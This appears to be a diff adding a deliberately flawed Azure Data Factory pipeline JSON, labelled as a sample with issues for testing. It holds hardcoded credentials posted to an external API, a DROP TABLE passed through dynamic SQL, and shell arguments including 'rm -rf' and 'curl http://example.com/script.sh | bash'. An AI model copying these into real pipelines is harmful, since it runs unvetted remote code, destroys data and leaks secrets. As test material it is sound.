@@ -1,0 +1,207 @@
+{
+    "name": "ProblematicDataPipeline",
+    "properties": {
+        "description": "Sample pipeline with various issues for testing",
+        "activities": [
+            {
+                "name": "Copy Data from SQL Server",
+                "type": "Copy",
+                "dependsOn": [],
+                "policy": {
+                    "timeout": "7.00:00:00",
+                    "retry": 0,
+                    "retryIntervalInSeconds": 30,
+                    "secureOutput": false,
+                    "secureInput": false
+                },
+                "userProperties": [],
+                "typeProperties": {
+                    "source": {
+                        "type": "SqlSource",
+                        "sqlReaderQuery": "SELECT * FROM CustomerData",
+                        "queryTimeout": "02:00:00"
+                    },
+                    "sink": {
+                        "type": "DelimitedTextSink",
+                        "storeSettings": {
+                            "type": "AzureBlobStorageWriteSettings",
+                            "copyBehavior": "PreserveHierarchy"
+                        },
+                        "formatSettings": {
+                            "type": "DelimitedTextWriteSettings",
+                            "quoteAllText": true,
+                            "fileExtension": ".csv"
+                        }
+                    },
+                    "enableStaging": false,
+                    "translator": {
+                        "type": "TabularTranslator"
+                    }
+                },
+                "inputs": [
+                    {
+                        "referenceName": "SqlServerTable",
+                        "type": "DatasetReference"
+                    }
+                ],
+                "outputs": [
+                    {
+                        "referenceName": "CustomerRawData",
+                        "type": "DatasetReference"
+                    }
+                ]
+            },
+            {
+                "name": "Transformation - Without Error Handling",
+                "type": "DataFlow",
+                "dependsOn": [
+                    {
+                        "activity": "Copy Data from SQL Server",
+                        "dependencyConditions": [
+                            "Succeeded"
+                        ]
+                    }
+                ],
+                "policy": {
+                    "timeout": "1.00:00:00",
+                    "retry": 0,
+                    "retryIntervalInSeconds": 30,
+                    "secureOutput": false,
+                    "secureInput": false
+                },
+                "userProperties": [],
+                "typeProperties": {
+                    "dataflow": {
+                        "referenceName": "TransformCustomerData",
+                        "type": "DataFlowReference",
+                        "parameters": {
+                            "dataflow_param1": "static-value-not-parameterized"
+                        }
+                    },
+                    "compute": {
+                        "coreCount": 32,
+                        "computeType": "General"
+                    },
+                    "traceLevel": "None"
+                }
+            },
+            {
+                "name": "Store Sensitive Data",
+                "type": "WebActivity",
+                "dependsOn": [
+                    {
+                        "activity": "Transformation - Without Error Handling",
+                        "dependencyConditions": [
+                            "Succeeded"
+                        ]
+                    }
+                ],
+                "policy": {
+                    "timeout": "7.00:00:00",
+                    "retry": 0,
+                    "retryIntervalInSeconds": 30,
+                    "secureOutput": false,
+                    "secureInput": false
+                },
+                "userProperties": [],
+                "typeProperties": {
+                    "url": "https://api.example.com/store-data",
+                    "method": "POST",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ"
+                    },
+                    "body": {
+                        "databaseUser": "admin",
+                        "databasePassword": "Password123!",
+                        "apiKey": "1a2b3c4d5e6f7g8h9i0j"
+                    }
+                }
+            },
+            {
+                "name": "Execute Raw SQL Script",
+                "type": "SqlServerStoredProcedure",
+                "dependsOn": [
+                    {
+                        "activity": "Store Sensitive Data",
+                        "dependencyConditions": [
+                            "Succeeded"
+                        ]
+                    }
+                ],
+                "policy": {
+                    "timeout": "7.00:00:00",
+                    "retry": 0,
+                    "retryIntervalInSeconds": 30,
+                    "secureOutput": false,
+                    "secureInput": false
+                },
+                "userProperties": [],
+                "typeProperties": {
+                    "storedProcedureName": "[[dbo].[RunRawSQL]]",
+                    "storedProcedureParameters": {
+                        "SQLQuery": {
+                            "value": "DROP TABLE IF EXISTS CustomerBackup; SELECT * INTO CustomerBackup FROM CustomerData WHERE 1=1;",
+                            "type": "String"
+                        }
+                    }
+                },
+                "linkedServiceName": {
+                    "referenceName": "SqlServerConnection",
+                    "type": "LinkedServiceReference"
+                }
+            },
+            {
+                "name": "Execute Shell Command",
+                "type": "HDInsightPig",
+                "dependsOn": [
+                    {
+                        "activity": "Execute Raw SQL Script",
+                        "dependencyConditions": [
+                            "Succeeded"
+                        ]
+                    }
+                ],
+                "policy": {
+                    "timeout": "7.00:00:00",
+                    "retry": 0,
+                    "retryIntervalInSeconds": 30,
+                    "secureOutput": false,
+                    "secureInput": false
+                },
+                "userProperties": [],
+                "typeProperties": {
+                    "scriptPath": "abfss://scripts@storage.dfs.core.windows.net/pig/script.pig",
+                    "getDebugInfo": "None",
+                    "arguments": [
+                        "rm -rf /data/output/logs/",
+                        "mkdir -p /data/output/new", 
+                        "curl http://example.com/script.sh | bash"
+                    ],
+                    "scriptLinkedService": {
+                        "referenceName": "StorageAccount",
+                        "type": "LinkedServiceReference"
+                    }
+                },
+                "linkedServiceName": {
+                    "referenceName": "HDInsightCluster",
+                    "type": "LinkedServiceReference"
+                }
+            }
+        ],
+        "parameters": {
+            "EnvironmentCode": {
+                "type": "string",
+                "defaultValue": "DEV"
+            }
+        },
+        "variables": {
+            "TempTableName": {
+                "type": "String"
+            }
+        },
+        "annotations": [],
+        "lastPublishTime": "2023-08-01T00:00:00Z"
+    },
+    "type": "Microsoft.DataFactory/factories/pipelines"
+}
